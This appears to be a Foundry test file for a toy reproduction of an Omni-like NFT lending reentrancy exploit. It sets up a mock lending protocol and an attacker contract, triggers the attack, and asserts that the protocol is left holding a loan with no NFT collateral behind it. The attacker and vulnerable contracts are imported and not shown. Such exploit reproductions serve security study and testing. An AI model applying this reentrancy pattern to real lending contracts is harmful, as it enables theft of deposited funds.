// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    ERC20Mock2,
    NFTMock,
    OmniLikeLending,
    OmniReentrancyAttacker
} from "../src/Omni.sol";

contract OmniToyTest is Test {
    ERC20Mock2 loanToken;
    NFTMock nft;
    OmniLikeLending lending;
    OmniReentrancyAttacker attacker;

    uint256 constant TOKEN_ID = 1;

    function setUp() public {
        loanToken = new ERC20Mock2();
        nft = new NFTMock();
        lending = new OmniLikeLending(nft, loanToken);

        // Lending protocol has liquidity for loans
        loanToken.mint(address(lending), 1_000 ether);

        // Deploy attacker contract
        attacker = new OmniReentrancyAttacker(lending, nft, loanToken);

        // Mint NFT to attacker contract
        nft.mint(address(attacker), TOKEN_ID);

        // Attacker deposits NFT and borrows once normally
        vm.prank(address(attacker));
        lending.deposit(TOKEN_ID);                // omni holds NFT, collateralOwner[TOKEN_ID] = attacker
        vm.prank(address(attacker));
        lending.borrow(TOKEN_ID, 100 ether);      // debt[attacker] = 100, attacker has 100 LOAN

        // Allow lending to pull LOAN from attacker to repay
        vm.prank(address(attacker));
        loanToken.approve(address(lending), type(uint256).max);
    }

    function test_OmniLikeReentrancyExploit() public {
        // Sanity before exploit
        assertEq(loanToken.balanceOf(address(attacker)), 100 ether);
        assertEq(lending.debt(address(attacker)), 100 ether);
        assertEq(lending.collateralOwner(TOKEN_ID), address(attacker));

        // External EOA triggers the attack, which calls repayAndWithdraw
        vm.prank(address(0xBEEF));
        attacker.attack(TOKEN_ID, 100 ether);

        // After:
        // - Attacker has borrowed again during onERC721Received.
        // - Attacker still has debt, but the NFT is no longer locked as collateral.
        assertEq(lending.collateralOwner(TOKEN_ID), address(0));    // NFT not held as collateral
        assertEq(nft.ownerOf(TOKEN_ID), address(attacker));         // attacker owns NFT again
        assertEq(lending.debt(address(attacker)), 100 ether);       // new loan
        assertEq(loanToken.balanceOf(address(attacker)), 100 ether); // still holds 100 LOAN

        // -> Protocol now carries an under-collateralized loan.
        // There is debt on attacker but no NFT backing it inside the lending contract.
    }
}
